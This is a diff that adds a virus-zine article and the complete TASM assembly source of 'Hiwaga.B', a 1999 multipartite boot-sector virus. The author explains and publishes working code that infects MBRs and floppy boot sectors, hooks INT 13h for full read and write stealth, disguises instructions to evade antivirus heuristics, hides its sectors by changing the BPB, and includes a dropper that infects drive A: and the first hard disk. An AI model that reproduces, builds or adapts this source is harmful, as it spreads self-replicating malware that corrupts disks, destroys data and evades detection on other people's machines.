@@ -1,0 +1,762 @@
+Hiwaga 
+
+  
+
+Before I go any further, I would like to make it clear that Hiwaga, specifically this program source code, was intended as the boot component of the multipartite Hiwaga virus. Because of the embarrassing thing that happened to me, I lost interest in completing the program. Since I am satisfied with the boot component, I decided to make it public in PVW Zine No 5. 
+
+When you go over the source code, you might wonder why I did this or that. As mentioned, this is supposed to be a multipartite virus and an unencrypted one at that. I did things to hide or mask instructions that could possibly trigger AVs heuristic flags. If you stumble upon something crazy, I hope you would understand my intent. 
+
+And now to the virus.... 
+
+VIRUS BOOT SECTOR 
+
+The virus boot sector is only 46 bytes long. Its sole purpose is to load the main virus code stashed somewhere on the disk. 
+
+I learned that an AV checks the kind INT 13h call being made. Even if at that time Fn 02 is not included on those it checks for, I set AH to 2 in an indirect way in case Fn 02 was added in later versions. That is only one AV. I am only playing safe and it helps muddle things. 
+
+Another crazy thing I did here is the "CALL $+3"/"POP BX" pair to get the current offset. Why did I do it? I read that the reason why boot virus does not work in an OS/2 DOS session is because the boot is executed at 0000:7000, or something like that. I could not recall where I saw this but it was ages ago. (You know your brain is like a sponge that when squeezed things just pop out.) So I decided to give it a go. The only problem to this is if a program passes control to 07C0:0000. I think there is a virus that does this but I am not really sure. 
+
+GOING MEMORY RESIDENT 
+
+There is nothing fancy here except for some hiding stuff. Just like any other boot virus, it decreases the base memory, moves its code to the top of memory, saves and hooks INT 13h, infects the hard disk, and continues the execution of the boot. As you can see, just the usual stuff. 
+
+The payload release is also done here but let us skip that for a while. 
+
+INFECTION 
+
+Infection is triggered on a write to disk. However, this is limited to a write to the MBR (0/0/1) for hard disks. 
+
+The program checks the first instruction of the boot sector or MBR whether it is a short jump. The jump is followed and from there the virus loader routine is patched. If the object drive is a hard disk (only the first, if you have more than one hard disk installed) and the first instruction is not a short jump, the virus loader is patched starting at the first byte of the MBR. In case of diskettes, they are only infected if the code starts with a short jump. The program does not save the entire sector but only the portions of the boot sector or MBR that were overwritten. To determine previous infections, the program uses a fragment of the loader routine as determinant. 
+
+The program stores its main code in the last two sectors of the hard disk's track 0 side 0. These sectors are unused. On diskettes, the main program code is located at the disk's last two sectors. This is determined using data found in the BPB in the boot sector. The program assumes that the BPB contains valid data and the disk has two sides. To prevent DOS from acknowledging the existence of these two sectors, the program alters the value of the "TotalDiskSectors" in the BPB. (I first saw this used by DIR-II and I implemented it in the Philippines.4096.) This results to the disappearance of two sectors from your diskette. The program does not check whether the two sectors are in use. If so, all data in these sectors are permanently lost. 
+
+STEALTH 
+
+Hiwaga is read and write stealth, a full stealth virus. Well, almost... 
+
+If a read is made on the boot sector or MBR, the "original" sector is returned to the caller. And on hard disks, read on the sectors occupied by the virus is returned with these sectors wiped of its content. This hides the existence of the virus from prying programs. 
+
+On a write to the boot sector or MBR, the program modifies the data to be written to by patching it with the program loader and saving the portions that were overwritten. The program assumes that the one performing the write did a read prior to the write, which is not true in some cases as there are "overwriting" boot infectors. 
+
+On a hard disk infection, write to the sectors occupied by the program is returned without executing the write and accompanied by an error with a code for write-protect. 
+
+The program does not trap read or write to the two sectors it uses in diskettes. It relies on the fact that these sectors are not accessible through the operating system. It is also safe from well- behaved programs that do physical sector access. Problems would only arise in conjunction with programs that assume sectors or use specific sectors. Tough luck if that happens. 
+
+PAYLOAD 
+
+The program has a payload that was added to fill up the slack in the sector. 
+
+The payload is a message display (actually, half of the lyrics of an old song) that is date triggered. If the day-of-the-month is the same as the month (January 1, February 2, etc.) the payload is displayed. Determination of payload release is done after hooking INT 13h in the initialization phase of the program. 
+
+BUG FIX 
+
+The Hiwaga that appeared in PVW Zine No 5 has a bug that would make bring lamers close to dehydration from crying if it infects the hard disk. 
+
+I was not able to mask off the high bits of cylinder/track from CL after a 13/08 call. This resulted to an invalid sector number for the VirusSavedSector. I also was not able to preserve the spec of the object drive which is lost after a 13/08 call. This means that the program writes whatever is intended for the hard disk VirusSavedSector to a floppy or a non-existent drive. Since there is no error checking, the program continued to execute despite the errors. A crash would result if a boot is made through an infected hard disk. 
+
+While I was doing the hard disk fix, I did a second look at the diskette last sector routine and it looks too ungainly, if not buggy. So I did a rewrite on this portion too. 
+
+To differentiate this version to the one in PVW Zine No 5 (A86 compiled), I compiled this one in TASM v2.01. However, nobody is stoping you from compiling the program listing in a compiler of your choice. If you will use A86, delete all align directive and adjust accordingly. Some fixes for A86 are also noted in the program listing. 
+
+I hope the fixed everything and would not need further fixing. 
+
+Enjoy! 
+
+
+
+--------------------------------------------------------------------------------
+
+ -------hiwaga.asm starts here------------ cut here--------------------
+ ;
+ ;   Virus Name: Hiwaga.B
+ ;       Author: Putoksa Kawayan
+ ;       Origin: Manila, Philippines
+ ; Date Written: February 7, 1999
+ ;    Bug Fixed: May 27, 1999
+ ;     Compiler: TASM v2.01 (TASM /M)
+ ;
+ BootSectorBpb           struc
+   BpbEntryPtJump           db    3 dup (?)   ; usually, short jump and nop
+   BpbOem                   db    8 dup (?)   ; usually, dos version
+   BpbBytesPerSector        dw    ?           ; number of bytes in one sector for the disk
+   BpbSectorsPerCluster     db    ?           ; number of sectors in one cluster for the disk
+   BpbReservedSectors       dw    ?           ; number of reserved sectors starting at sector 0
+   BpbNumberFATCopies       db    ?           ; number of copies of the file allocation table (FAT).
+   BpbRootDirectoryEntries  dw    ?           ; maximum number of entries for the root directory
+   BpbTotalDiskSectors      dw    ?           ; total number of sectors on the disk
+   BpbMediaDescriptorByte   db    ?           ; media descriptor byte
+   BpbSectorsPerFAT         dw    ?           ; number of sectors in a file allocation table
+   BpbSectorsPerTrack       dw    ?           ; number of sectors in one track
+   BpbNumberOfHeads         dw    ?           ; number of heads/sides
+   BpbSpecialHiddenSectors  dw    ?           ; number of hidden sectors
+   BpbBigTotalSectors       dd    ?           ; total number of sectors if BpbTotalDiskSectors is zero
+   BpbDriveNumber           db    ?           ; physical drive number
+   BpbReserved              db    ?           ; *** don't know ***
+   BpbBootSignature         db    ?           ; signature byte for boot record
+   BpbVolumeId              dd    ?           ; volume serial number
+   BpbVolumeLabel           db    11 dup (?)  ; volume label
+   BpbFileSystemType        db    8 dup (?)   ; file system type
+   BpbBootCodeAndMessages   db    450 dup (?) ; boot loader and error messages
+   BpbBootableDiskId        db    ?,?         ; constant: 55h,0AAh
+ BootSectorBpb           ends
+ 
+  .286
+ 
+ Hiwaga segment para 'code'
+ assume cs:Hiwaga, ds:Hiwaga
+ 
+ BytPerSec equ  512
+ MemKbNeed equ  ((offset EndVirus-offset BootTsr)/(BytPerSec*2))
+ NumSecVx  equ  ((offset DiskBuffer-offset BootTsr)/(BytPerSec))
+ Int13v    equ  13h*4
+ CodeLen   equ  offset EndVirus-offset BootTsr
+ LocOld13  equ  offset Old13Handler-offset BootTsr
+ MemKbyte  equ  413h
+ org 0
+ ;
+ ; make the virus reside in memory.
+ ;
+ BootTsr:
+      push ss
+      pop  ds
+      call SaveInterrupt            ; save int 13h
+      mov  ax,word ptr ds:[si+(MemKbyte-LocOld13)]
+      sub  cx,ax                    ; decrease memory. CX is loaded with
+      neg  cx                       ;     NumSecVx in SaveInterrupt
+      mov  ax,cx
+      ror  cx,10                    ; convert to segment == shl cx,6
+      mov  es,cx                    ; load ES with segment of top mem
+      mov  word ptr ds:[di+(MemKbyte-Int13v)],ax  ; update memory 
+      xchg ax,cx
+      mov  si,bx                    ; set for copy virus to memory top
+      xor  di,di
+      mov  cx,(CodeLen+4)/2
+ CopyTopMem:
+      dec  cx
+      movsw
+      jns  CopyTopMem
+      call HookInterrupt            ; hook int 13h then test for show message
+      push ss
+      pop  es
+ ;
+ ; replace
+ ;           lea  si,ds:[bx+(offset SavedOrigBoot-offset BootTsr)]
+ ; with:
+ ;           lea  si,ds:[bx+5dh]
+ ;
+ ; if you will use a86
+ ;
+      lea  si,ds:[bx+(offset SavedOrigBoot-offset BootTsr)]
+      mov  bx,sp
+      call GetLocationLoader        ; get start of loader routine
+      mov  di,bx                    ; set pointer to overwritten boot code
+      add  di,ax
+      mov  cx,(offset Maylikha-offset VxBootSec)
+      rep  movsb                    ; restore original boot code
+      mov  dh,cl                    ; set check for presence of hard disk
+      inc  cx                       ;   dh=0 and cx=1
+      push bx                       ; set return offset to execute boot
+      or   dl,dl                    ; if sign bit set, then hard disk boot
+      js   HardDiskBoot
+      push dx
+      mov  dl,cl                    ; read hard disk mbr
+      mov  ax,201h                  
+      ror  dl,1
+      mov  bx,si
+ ResetDisk:                         ; if you could read it, then its there
+      int  13h                      ; we do it over and over until its done
+      jc   ResetDriveCode           ; or until disk reset returns an error
+      mov  ax,not 0301h             ; hide "mov ax,301h"
+      not  ax                       ; writing to the mbr would make the virus
+      int  13h                      ; infect it
+      mov  ah,dh                    ; set for disk reset
+      cmc                           ; flip carry bit
+      jnc  ResetDisk
+ ResetDriveCode:
+      pop  dx                       ; retrieve old drive spec
+ HardDiskBoot:
+      ret                           ; execute original boot loader
+ ;
+ ; this holds the overwritten portion of the original boot code. because 
+ ; of forward reference compile error (tasm might reset your computer), 
+ ; LoaderLen was replaced with an immediate value. so if you are thinking
+ ; of modifying, make sure you use the right value. if moved to another 
+ ; part of the code, you could use this instead:
+ ;
+ ;              SavedOrigBoot  db  LoaderLen dup (?)
+ ;
+ ; to make the stealth of the virus is compatible with all compiles,
+ ; SavedOrigBoot should be at offset 5dh of the the virus.
+ ;
+ SavedOrigBoot  db  2dh dup (?)
+ ;
+ ; this is the virus' code in the boot sector. what it does is simply
+ ; to load to memory the main virus code stored somewhere on the disk.
+ ;
+ VxBootSec:
+      cli
+      xor  ax,ax
+      mov  ss,ax
+      mov  sp,7c00h
+      sti
+      push ss
+      pop  es
+      call $+3                      ; get code origin. trouble if 07c0:0000 :(
+      mov  dh,-1                    ; head/side of VirusSavedSector
+ LocSaveSide equ byte ptr $-1
+      mov  cx,-1                    ; track and sector of VirusSavedSector
+ LocSaveTrkSec equ word ptr $-2
+      cmc                           ; flip carry bit == set carry bit for sbb
+      pop  bx                       ; retrieve code origin
+      mov  ah,bh                    ; reset code origin
+      mov  sp,ax                    ; reset sp == start of boot code
+ ReTryReadCode:
+      mov  bx,sp                    ; set read buffer
+      sbb  ax,ax                    ; went to all these trouble just
+      neg  ax                       ;   to set AH to 2 would have done 
+      inc  ax                       ;   also for AL if not for stealth
+      rol  ax,8                     ;   compatability of multipartite and 
+      add  al,NumSecVx              ;   boot versions
+ BootSigLen equ ($-ReTryReadCode)-1 ; not a bad infection sig. wayatenk?
+      add  bh,al                    ; adjust read buffer, note that AL=2 
+      int  13h                      ; replace AL with AH if NumSecVx is not 2
+      jc   ReTryReadCode
+      jmp  bx                       ; execute BootTsr
+ ;___________________________________________________________________________
+ ;===========================================================================
+ ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~who robbed berto of sun rays?
+ Maylikha  db   'Putoksa Kawayan' ;; <---- is you robbed berto of sun rays? 
+ ;_________________________________________why ask me? ask the maggot!  :)
+ ;===========================================================================
+ ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ LoaderLen equ  (offset Maylikha-offset VxBootSec)
+ ;
+ ; int 13 handler -- traps read and write to disk
+ ;
+ ;   on read : hide infection, traps VirusSavedSector in hard disks
+ ;   on write: infect disk, stealth on FirstSector and, for hard disks,
+ ;             VirusSaveSector also
+ ;
+ Handler13:
+      cmp  ah,2                     ; read sector
+      je   StealthRead
+      cmp  ah,3                     ; write sector
+      jne  PassToOld13
+ ;
+ ; handler for write sector
+ ;
+      or   dh,dh                    ; check for write to FirstSector (0/0/1)
+      jnz  CheckWriteFloppy
+      cmp  cx,1
+      je   WriteFirstSector
+ ;
+ ; handler for write to VirusSavedSector on hard disk
+ ;
+      cmp  dl,80h                   ; first hard disk only
+      jne  CheckWriteFloppy
+      pusha
+      add  al,cl                    ; get ending sector of write
+      push ax
+      call GetDiskLastSector        ; find out where we stored the virus
+      pop  ax
+      cmp  al,cl                    ; does it overlaps the VirusSavedSector
+      jb   SkipDS   
+      popa                          ; return an error for write protected
+      xor  al,al                    ; which is AH = 3
+      stc
+      jmp  short ReturnToCaller13
+ ;
+ ; handler for write to FirstSector (0/0/1). it is assumed that the program
+ ; writing to FirstSector had been given the original boot code on read and
+ ; that it did a read prior to write.
+ ;
+ WriteFirstSector:
+      call ReadFirstSectorToMemory  ; read boot sector from disk
+      call GetLocationLoader        ; get start of loader routine
+      jc   DoneWrite
+      call CheckInfected            ; is it infected?
+      pop  es
+      pop  bx
+      je   WriteStealth
+ ;
+ ; handler for write to FirstSector (0/0/1) that is not yet infected.
+ ; infect the new FirstSector.
+ ;
+      call GetDiskLastSector        ; determine where to save the virus
+      call SaveOriginalBootCode     ; copy and save original,put virus code
+      xor  ax,ax
+      call SaveVirusCode            ; write virus code to VirusSavedSector
+      call RestoreOrigBoot          ; execute write to disk
+ ;
+ ; handler for write to FirstSector (0/0/1) that is already infected.
+ ; infect the new FirstSector code and update saved FirstSector data
+ ;
+ WriteStealth:
+      call SaveOriginalBootCode     ; copy and save original,put virus code
+      push bx
+      mov  bx,201h                  ; read VirusSavedSector
+      mov  ax,offset DiskBuffer
+      call LoadLocationVirusSaved
+      call SetRestoreOrigBoot
+ ;
+ ; handler for write to floppies == infection
+ ;
+ CheckWriteFloppy:
+      or   dl,dl                    ; check for diskete only infects first
+      js   PassToOld13              ; hard disk which is infected on boot
+      call ReadFirstSectorToMemory  ; read boot sector from disk
+      call GetLocationLoader        ; get start of loader routine
+      jc   DoneWrite
+      call CheckInfected            ; is it infected?
+      je   DoneWrite
+      call GetDiskLastSector        ; determine where to save the virus
+      call SaveOriginalBootCode     ; copy and save original,put virus code
+      xor  ax,ax
+      call SaveVirusCode            ; write virus code to VirusSavedSector
+      mov  bx,301h
+      call DiskAccessFromVirusBuffer ; write virus to boot sector
+ DoneWrite:
+      pop  es
+      pop  bx
+      pop  ds
+ SkipDS:
+      popa
+ PassToOld13:
+      call UseOld13                 ; execute int 13h
+ ReturnToCaller13:
+      retf 2                        ; return to caller
+ ;
+ ; handler for read sector == stealth handler
+ ;
+ StealthRead:
+      call UseOld13                 ; execute read
+      jc   ReturnToCaller13
+      pushf
+      or   dh,dh                    ; check for FirstSector
+      jnz  ReturnToReadCaller
+      or   ch,ch
+      jnz  ReturnToReadCaller
+      cmp  cl,1
+      je   ReadFirstSector
+      cmp  dl,80h                   ; check if first hard disk
+      jne  ReturnToReadCaller
+ ;
+ ; handler for read to VirusSavedSectors on hard disk. does not trap read
+ ; to VirusSavedSectors on floppies
+ ;
+      pusha
+      push ax
+      add  al,cl               ; get upper limit of read
+      push ax
+      call GetDiskLastSector
+      pop  ax
+      sub  al,cl               ; is VirusSavedSector included in read
+      mov  ch,al               ; save num sectors of VirusSavedSector read
+      pop  ax
+      jc   DoneWithStealth
+      mov  di,bx
+      sub  al,ch               ; get num sectors outside VirusSavedSector
+      cbw
+      mov  bp,BytPerSec
+      mul  bp                  ; convert to bytes
+      add  di,ax               ; set to skip those sectors
+      mov  al,ch
+      cbw
+      mul  bp                  ; convert to bytes, sectors in VirusSavedSector
+      xchg ax,cx
+      xchg ax,dx
+      cld
+      rep  stosb               ; wipe any trace of the virus
+ DoneWithStealth:
+      popa
+ ReturnToReadCaller:
+      popf
+      retf 2                   ; return to caller
+ ;
+ ; handler for read of FirstSector == head 0 track 0 sector 1
+ ;
+ ReadFirstSector:
+      pusha
+      push ds
+      push cs
+      pop  ds
+      call GetLocationLoader        ; get start of loader routine
+      jc   NothingToDo
+      call CheckInfected            ; is it infected
+      jne  NothingToDo
+      push bx
+      mov  bx,201h                  ; read VirusSavedSector
+      mov  ax,offset DiskBuffer
+      call LoadLocationVirusSaved
+      mov  di,0
+ LocPatchOrigBoot equ word ptr $-2
+      mov  si,bx                    ; restore original boot code
+      add  si,offset SavedOrigBoot
+      pop  bx
+ RestoreBootCode:
+      add  di,bx
+      mov  cx,LoaderLen
+      rep  movsb
+ NothingToDo:
+      pop  ds
+      jmp  DoneWithStealth
+ ;
+ ; updates original boot code in VirusSavedSector
+ ;
+ SetRestoreOrigBoot:
+      pop  ax                       ; retrieve from stack return offset
+      xchg ax,bx
+      mov  si,offset SavedOrigBoot
+      mov  di,si
+      mov  bx,301h
+      add  di,ax
+      mov  cx,LoaderLen             ; copy saved original code to buffer
+      rep  movsb
+      call LoadLocationVirusSaved   ; update saved code in VirusSavedSector
+      pop  bx
+      jmp  short SkipRetrieveRet
+ ;
+ ; restores the original boot code of the program writing to FirstSector
+ ; stealth on write also :)
+ ;
+ RestoreOrigBoot:
+      pop  ax                       ; retrieve from stack return offset
+ SkipRetrieveRet:
+      pop  ds
+      popa
+      call UseOld13                 ; execute write to disk
+      pushf
+      pusha
+      push ds                       ; restore original boot code
+      push cs
+      pop  ds
+      mov  di,cs:[LocPatchOrigBoot]
+      mov  si,offset SavedOrigBoot
+      add  di,bx
+      mov  cx,LoaderLen
+      rep  movsb
+      pop  ds
+      jmp  DoneWithStealth          ; return to caller
+ ;_____________________
+ ;~~~~~~~~~~~~~~~~~~~~~;
+ VirusName db 'Hiwaga' ;
+ ;_____________________;
+ ;~~~~~~~~~~~~~~~~~~~~~
+ ;
+ date db   2,7,99h                     ; February 7, 1999
+ ;
+ ; determines location of first instruction after entry jump. on floppies 
+ ; a short jump is needed to skip over the bpb. else floppy is not infected
+ ; short jump is needed for call/pop in virus loader
+ ;
+ GetLocationLoader:
+      mov  ax,es:[bx]               ; get entry point instruction BootSec[0]
+      cmp  al,0ebh                  ; short jump?
+      jne  NotShortJump
+      mov  al,ah                    ; adjust to offset
+      xor  ah,al
+      inc  ax
+      inc  ax
+ IsFirstHardDisk:
+      ret
+ NotShortJump:
+      xor  ax,ax                    ; set for hard disk
+      cmp  dl,80h                   ; is it first hard disk?
+      je   IsFirstHardDisk
+      stc                           ; if not, do not infect it
+      ret
+ ;
+ ; reads FirstSector to virus buffer
+ ;
+ ReadFirstSectorToMemory:
+      pop  word ptr cs:[ReturnPoint] ; save return offset
+      pusha
+      push ds
+      push bx
+      push es
+      push cs
+      pop  ds
+      push cs
+      pop  es
+      push word ptr cs:[ReturnPoint] ; restore return offset
+ ReadVirusSavedSector:
+      mov  bx,201h                  ; read boot sector/mbr
+ DiskAccessFromVirusBuffer:
+      mov  ax,offset DiskBuffer
+      mov  cx,1
+      mov  dh,ch
+ SwapRegisters:
+      xchg ax,bx                    ; this is to hide from avs
+ UseOld13:
+      push ax
+      xor  ax,ax                    ; reset disk
+      call UseRealOld13
+      pop  ax
+ UseRealOld13:
+      pushf                         ; invoke original int 13h handler
+      call dword ptr cs:[Old13Handler]
+      ret
+ ;
+ ; infection check
+ ;
+ CheckInfected:
+      push ds
+      push cs
+      pop  ds
+      mov  si,offset ReTryReadCode  ; setup for infection check
+      mov  di,bx
+      mov  word ptr ds:[LocPatchOrigBoot],ax
+      add  ax,ReTryReadCode-VxBootSec
+      add  di,ax
+      mov  cx,BootSigLen
+      cld
+      repe cmpsb                    ; check if infected
+      jne  NotInfected
+      sub  ax,ReTryReadCode-LocSaveTrkSec
+      mov  si,ax
+      mov  cx,es:[bx+si]            ; get location of VirusSavedSector
+      mov  dh,es:[bx+si-2]
+      cmp  al,al                    ; set the zero flag. better and faster 
+ NotInfected:                       ; this way than the pushf/popf tandem
+      pop  ds
+      ret
+ ;
+ ; writes rest of virus to somewhere at the end of the diskette or end of
+ ; head 0 track 0 in hard disk
+ ;
+ SaveVirusCode:
+      mov  bx,300h or NumSecVx      ; set for write to VirusSavedSector
+ LoadLocationVirusSaved:
+      push es
+      push cs
+      pop  es
+      mov  cx,cs:[LocSaveTrkSec]    ; load track and sector
+      mov  dh,cs:[LocSaveSide]      ; load head/side
+      call SwapRegisters
+      pop  es
+      ret
+ ;
+ ; determines where to save the virus code.
+ ;
+ GetDiskLastSector:
+      or   dl,dl               ; what disk?
+      jns  LastSectorFloppy    ; its floppy
+ FindEndTrack0:
+      push dx                  ; save drive spec, lost after the call
+      mov  ah,8                ; find last sector of track in hard disk
+      call UseOld13
+      pop  dx                  ; retrieve drive spec
+      jc   FindEndTrack0       ; try again and again until its ok
+      and  cl,3fh              ; mask off track high bits
+      sub  cl,NumSecVx-1       ; and set loc of VirusSavedSector
+      xor  dh,dh               ; set for track 0 side 0
+      mov  ch,dh
+      jmp  short SetLocationVirusSaved
+ LastSectorFloppy:
+      push dx                            ; save drivespec
+      mov  ax,es:BpbTotalDiskSectors[bx] ; get total disk sectors
+      mov  bp,ax
+      sub  bp,NumSecVx                   ; reserve space for virus
+      mov  cx,es:BpbSectorsPerTrack[bx]  ; sectors per track
+      push cx                            ; save it for a while
+      shl  cx,1                          ; assume two-side diskette
+      xor  dx,dx
+      div  cx                            ; determine track of last sector
+      pop  cx                            ; retrieve sectors per track
+      xchg dx,ax                         ; save track number
+      sub  ax,cx                         ; check if on which side we are
+      mov  dh,1                          ; assume side 1
+      ja   SideSet
+      add  ax,cx                         ; restore sector coz
+      xor  dh,dh                         ; we are on side 0
+ SideSet:
+      cmp  al,NumSecVx                   ; enough sector in track?
+      jnc  SetStartSector
+      sub  bp,ax                         ; if not, zap those sectors
+      xchg cx,ax                         ; use max sector per track
+      or   dh,dh                         ; are we on side 0
+      jnz  StillInTrack
+      dec  dx                            ; if side 0, adjust track number
+ StillInTrack:
+      xor  dh,1                          ; toggle side 
+ SetStartSector:
+      sub  al,NumSecVx-1                 ; set sector of VirusSavedSector
+      mov  ah,dl                         ; get track num
+      xchg cx,ax
+      mov  es:BpbTotalDiskSectors[bx],bp ; alter total sectors in bpb
+      pop  ax                            ; retrieve drive spec
+      mov  dl,al
+ SetLocationVirusSaved:
+      mov  cs:[LocSaveSide],dh      ; save head/side
+      mov  cs:[LocSaveTrkSec],cx    ; save track and starting sector
+      ret
+ ;
+ ; saves the overwritten code of the original boot sector and copies
+ ; virus loader to the boot sector.
+ ;
+ SaveOriginalBootCode:
+      push bx
+      push ds
+      push es
+      pop  ds
+      push cs
+      pop  es
+      mov  ax,cs:[LocPatchOrigBoot]
+      add  bx,ax                    ; initialize pointers
+      mov  di,offset SavedOrigBoot
+      mov  si,offset VxBootSec
+      mov  cx,LoaderLen
+ CopyAndSave:
+      lods byte ptr cs:[si]         ; get virus boot loader
+      xchg [bx],al                  ; set virus loader and get orig boot code
+      stosb                         ; save overwritten original boot code
+      inc  bx
+      loop CopyAndSave
+      push ds
+      pop  es
+      pop  ds
+      pop  bx
+      ret
+ ;
+ ; saves interrupt vector and initializes registers used to hide from avs.
+ ;
+ SaveInterrupt:
+      mov  si,offset Old13Handler   ; set pointers for int 13h
+      mov  di,Int13v
+      les  ax,dword ptr [di]        ; get int 13h
+      mov  [bx+si],ax               ; and save
+      mov  [bx+si+2],es
+      mov  cx,MemKbNeed             ; set memory decrease count
+      cld                           ; set string operation direction
+      ret
+ ;
+ ; hook int 13h
+ ;
+ HookInterrupt:
+      mov  word ptr ds:[Int13v+2],ax  ;hook int 13h
+      mov  ax,offset Handler13
+      mov  word ptr ds:[Int13v],ax
+      pusha
+      mov  ah,4                       ; get today's date
+      int  1ah
+      cmp  dh,dl                      ; is day-of-the-month same as month
+      jne  NoShow
+      lea  si,ds:[bx+offset TitikNgAwitin] ; set pointer to titik-ng-awitin
+      mov  bx,7
+      mov  ah,0eh                     ; set display char
+ PrintLoop:
+      lodsb
+      xor  al,ah                      ; decrypt and.... 
+      jz   NoShow
+      int  10h                        ; ....show
+      jmp  PrintLoop                  ; do for the rest
+ NoShow:
+      popa
+      ret
+ ;
+ ; this was only placed here as an afterthought.... to fill up the slack
+ ; in the sector. :) i already encrypted it and just dump it here.
+ ;
+ ; anyways, these 8 lines are the lyrics of an easy-to-listen-to song. i first
+ ; heard this on the album of a foreign artist and was surprised to learn that
+ ; it's a filipino composition. i asked around and got a copy of its lyrics. 
+ ; it is about love.... but you have to know how to read in pilipino :)
+ ; dagsan-dagsan of thanx to birubs for the lyrics.
+ ;
+ ; anyhows, it's good enough for a filler :) and i like the song that's why i
+ ; show it to you twelve days a year. :)
+ ;
+ TitikNgAwitin label byte
+      db   3,4,9,13,46
+      db   "~oigeaz.`i.c{`ja",3,4,9,13,46 
+      db   "}gwo`i.geaz.jg`.`i.~o`ofa`",3,4,9,13,46 
+      db   "`iowa`.ow.zgbo.lo",3,4,9,13,46 
+      db   "~o`oig`g~.`i.eofo~a`",3,4,9,13,46 
+      db   "}oeobg`i.coyobo",3,4,9,13,46 
+      db   "l{fow.`o.~o`}oco`zobo",3,4,9,13,46 
+      db   "coizozoi~a.~o.|g`",3,4,9,13,46 
+      db   "~oiglgi.`o.cofgyoio",3,4,4,14
+ 
+ WhereIsMe db   ' Pilipinas'             ; my country
+ ;
+ ; Old13Handler should be dword aligned
+ ; 
+      align 4
+ Old13Handler label dword
+  Old13Ip  dw   ?
+  Old13Cs  dw   ?
+ 
+ ;
+ ; DiskBuffer should be page aligned. if it is not, use this
+ ;
+ ;PageAlign   equ $ - BootTsr
+ ;PageSlack   db ((((PageAlign/BytPerSec)+1)*BytPerSec)-PageAlign) dup (?)
+ ;
+ DiskBuffer  dw (BytPerSec/2) dup ('KP')
+ ReturnPoint dw ?
+ HulingHirit db 7,13,10,'Hiwaga ni Putoksa Kawayan',13,10
+             db 'Lungsod ng Maynila',13,10,'Republika ng Pilipinas',13,10,10
+             db 'Brought to you by HEX-FILES No. 5',13,10,10,'$'
+ ; dropper codes
+ ;
+ ; this would make the virus resident in lower memory. the virus would load
+ ; in higher memory (640 kb memory top) when you boot from an infected disk.
+ ;
+      align   2
+ FirstGen:
+      push es
+      push cs
+      pop  ds
+      mov  ax,3513h            ; save and hook int 13h
+      int  21h
+      mov  [Old13Ip],bx
+      mov  [Old13Cs],es
+      mov  dx,offset Handler13
+      mov  ax,2513h
+      int  21h
+      push cs
+      pop  es
+      xor  ax,ax
+      mov  dx,ax
+      int  13h
+      jc   Disk2
+      mov  ax,201h                ; read disk boot sector in drive a:
+      mov  bx,offset EndVirus
+      mov  cx,1
+      int  13h
+      jc   Disk2
+      mov  ax,301h                ; and infect it!
+      int  13h
+ Disk2:
+      xor  ax,ax
+      mov  dx,80h
+      int  13h
+      jc   Tsr
+      mov  ax,201h                ; read mbr of hard disk
+      mov  bx,offset EndVirus
+      mov  cx,1
+      int  13h
+      jc   Tsr
+      mov  ax,301h                ; and infect it!
+      int  13h
+ Tsr:
+      pop  es
+      mov  ah,9
+      mov  dx,offset HulingHirit
+      int  21h
+      mov  dx,(((FirstGen-BootTsr)+100h)/16)
+      mov  ah,31h
+      int  21h
+ 
+ ;
+ KbMemLen  equ $ - BootTsr
+ KbMmSlack db ((((KbMemLen/(BytPerSec*2))+1)*(BytPerSec*2))-KbMemLen) dup (?)
+ ;
+ EndVirus:
+ 
+ Hiwaga ends
+ 
+      end FirstGen
+
+ 
+
